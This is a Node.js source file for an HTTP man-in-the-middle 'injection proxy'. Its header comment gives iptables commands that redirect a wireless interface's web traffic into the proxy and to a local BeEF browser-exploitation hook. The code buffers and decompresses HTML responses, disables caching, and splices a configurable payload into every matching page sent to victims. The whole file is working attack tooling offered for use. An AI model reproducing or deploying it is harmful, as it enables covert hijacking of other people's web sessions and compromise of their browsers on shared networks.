/*
 * node.js Injection Proxy. 
 *
 * This simple multi threaded HTTP proxy injects code after a configurable 
 * pattern in http requests with content type text/html. 
 *
 * The follwing IPtables rule will... 
 * - redirct http traffic on wlan0 to the local proxy server
 * - redirect calls to port 3000 to the local beef hook
 * - pass thru all other traffic
 * 
 * iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 * iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 3000 -j DNAT --to-destination 127.0.0.1:3000
 * iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:3128
 * iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
 *
 * To allow rooting from external interfaces to the loopback device issue this comamnd:
 * sysctl -w net.ipv4.conf.wlan0.route_localnet=1 
 *
 */

require("mootools");
require("colors");

var Iconv  = require('iconv').Iconv,
    format = require("util").format,
    EventEmitter = require('events').EventEmitter,
    zlib = require('zlib'),
    dateFormat = require('dateformat'),
	cluster = require('cluster'),
	numCPUs = require('os').cpus().length,
	http = require('http'),
	ISOtoUTF = new Iconv('ISO-8859-1', 'UTF-8');
		
String.prototype.splice = function( idx, rem, s ) {
    return (this.slice(0,idx) + s + this.slice(idx + Math.abs(rem)));
};

var InjectionProxy = new Class({
	Extends: EventEmitter,
	settingsFile : "settings",
	settings : {},
	print : function(text){
		this.emit("print",text);
	},
	getSetting : function(key){
		var self = this;
		if(!key)
				return null;
		if(self.settings[key])
				return self.settings[key];
	},
	initialize : function() {
		var self = this;
		
		// import settings (settingsFile can be overwritten via second commandline parameter. 
		// Example: node injectionproxy.js altSettings.js
		if (process.argv.length === 3) self.settingsFile = process.argv[2];
		self.settings = require("./" + self.settingsFile);

		// react on asynchronously on printing event
		self.on("print", function(text) {
			var now = new Date();
			var formatedDate = dateFormat(now, self.getSetting("timeFormat"));
			console.log(("[" + formatedDate + "] ").grey.bold + text);
		});
		
		// Proxy will spawn a master and n workers where n is
		// the amount of CPUs in the computer
		if (cluster.isMaster) {
			self.master();
		} else {
			self.worker();
		}
	},
	master : function() {
		// Master logic
		var self = this;
		self.print(" node.js ".bgBlack.green.bold + " Injection Proxy 1.0");
		self.print(("Launching " + numCPUs + " workers...").green.bold);

		// fork workers
		for (var i = 0; i < numCPUs; i++) {
			cluster.fork();
		}

		// respawn crashed workers
		cluster.on('exit', function(worker, code, signal) {
			self.print(('Worker ' + worker.process.pid + ' died. Restarting worker...').red.bold);
			cluster.fork();
		});
	},
	worker : function() {
		var self = this;
		var debug = self.getSetting("debug");
		var injectionLocation = self.getSetting("injectionLocation");
		var injectBefore = self.getSetting("injectBefore");
		var payload = self.getSetting("payload");
		var offset = injectBefore ? 0 : injectionLocation.length;
		var preventCaching = self.getSetting("preventCaching");
		
		// Worker logic
		http.createServer(function(client_request, client_response) {
		
			// Assemble options for proxy -> target request
			var host = client_request.headers['host'];
			var port = 80;
			if (host && host.indexOf(":") > -1) {
				hostport = host.split(":");
				host = hostport[0];
				port = hostport[1];
			}
			var options = {
				host: host,
				port: port,
				path: client_request.url,
				method: client_request.method,
				headers: client_request.headers
			}
			
			if (preventCaching) {
				// keep server from giving us a 304 response
				delete(options.headers["if-match"]);
				delete(options.headers["if-range"]);
				delete(options.headers["if-unmodified-since"]);
				delete(options.headers["if-modified-since"]);
				delete(options.headers["if-none-match"]);
				delete(options.headers["last-modified"]);
				delete(options.headers["cache-control"]);
			}
			
			var caller = client_request.connection.remoteAddress;
			
			if (debug && caller != "undefined") {
				self.print(("(" + cluster.worker.id + ") ").grey.bold + caller.yellow + (" >>> " + host + " " + client_request.url).cyan);
			}
			
			var proxy_request = http.request(options, function(proxy_response) {
				
				// only successful html requests are relevant for injection
				function relevantForInjection() {
					return (proxy_response.statusCode == 200 && 
							proxy_response.headers["content-type"] &&
							proxy_response.headers["content-type"].indexOf("text/html") > -1);
				}
				
				// response chunks need to be merged and buffered because the injection
				// will change the content length and the content length needs to be sent
				// before the buffer is sent
				var buffered_chunks = []
				var totalLength = 0;

				// responses not relevant for rejection can be sent directly
				if (!relevantForInjection()) {
					client_response.writeHead(proxy_response.statusCode, proxy_response.headers);
				}
				
				// data event of target -> proxy -> client direction
				proxy_response.addListener('data', function(chunk) {
					
					// buffer html replies with http code 200, we may have to inject something
					if (relevantForInjection()) {
					
						buffered_chunks.push(chunk);
						totalLength += chunk.length;
						
					} else {
						
						// all other requests can be sent out directly without delay
						client_response.write(chunk, 'binary');
					}
				});
				
				// end event of target -> proxy -> client direction
				proxy_response.addListener('end', function() {
					
					// buffered chunks are handled at once in the end event
					if (buffered_chunks.length > 0) {

						// merge chunks. Avoid concatination with "+" because
						// this would convert the buffer to string and break the encoding
						var buffered_request = new Buffer(totalLength);
						var pos = 0;
						for (var i = 0; i < buffered_chunks.length; i++) {
							buffered_chunks[i].copy(buffered_request, pos);
							pos += buffered_chunks[i].length;
						}
						
						// handle compression
						var encoding = proxy_response.headers['content-encoding'];
						if (encoding == 'gzip') {
							zlib.gunzip(buffered_request, function(err, decoded) {
								// remove encoding header since we decoded it
								if(proxy_response.headers["content-encoding"]) 
									delete(proxy_response.headers["content-encoding"]);
								processBuffer(decoded);
							});
						} else if (encoding == 'deflate') {
							zlib.inflate(buffered_request, function(err, decoded) {
								// remove encoding header since we decoded it
								if(proxy_response.headers["content-encoding"]) 
									delete(proxy_response.headers["content-encoding"]);
								processBuffer(decoded);
							})
						} else {
							processBuffer(buffered_request);
						}
						
						function processBuffer(buffered_request) {
							
							// convert html to utf so node doesn't fuck up the encoding
							var html = ISOtoUTF.convert(buffered_request).toString();			

							// search injectionLocation and inject payload if found
							var injectionLocationPosition = html.toLowerCase().indexOf(injectionLocation);
							if (injectionLocationPosition > -1){
								
								// injection can proceed. replace buffered_request with payloded html
								var payloadedHtml = html.splice(injectionLocationPosition + offset, 0, payload);
								buffered_request = new Buffer(payloadedHtml, 'binary');								
								
								// since we changed the content, add payload length to content-length
								proxy_response.headers["content-length"] = buffered_request.length;
								
								if (caller != "undefined") {
									self.print(("(" + cluster.worker.id + ") ").grey.bold + caller.yellow.bold + (" Injected payload into " + client_request.url).green.bold);
								} else {								
									self.print(("Injected Payload into " + client_request.url).green.bold)
								}
							}
							

							// submit result to client
							client_response.writeHead(proxy_response.statusCode, proxy_response.headers);
							client_response.write(buffered_request);
							client_response.end();
							if (debug && caller != "undefined") {
								self.print(("(" + cluster.worker.id + ") ").grey.bold + caller.yellow + (" <<< " + host + " " + client_request.url).cyan);
							}
						}
						
					} else {
						client_response.end();
						if (debug && caller != "undefined") {
							self.print(("(" + cluster.worker.id + ") ").grey.bold + caller.yellow + (" <<< " + host + " " + client_request.url).cyan);
						}
					}			
				});
			});
			
			// error event of target -> proxy -> client direction
			proxy_request.on('error', function(err) {
				var debug = self.getSetting("debug");
				if (debug) self.print(("(" + cluster.worker.id + ") " + client_request.url + ": " + err).red.bold)
				client_response.writeHead(404);
				client_response.end("not found");
			});
			
			// data event of client -> proxy -> target direction
			client_request.addListener('data', function(chunk) {
				proxy_request.write(chunk, 'binary');
			});
			
			// end event of client -> proxy -> target direction
			client_request.addListener('end', function() {
				proxy_request.end();
			});
		  
		}).listen(self.getSetting("port"));
		
		self.print(("Worker " + cluster.worker.id + " waiting for incoming requests").green.bold);
	}
});
		
// Main routine: launch the proxy
var app = new InjectionProxy();
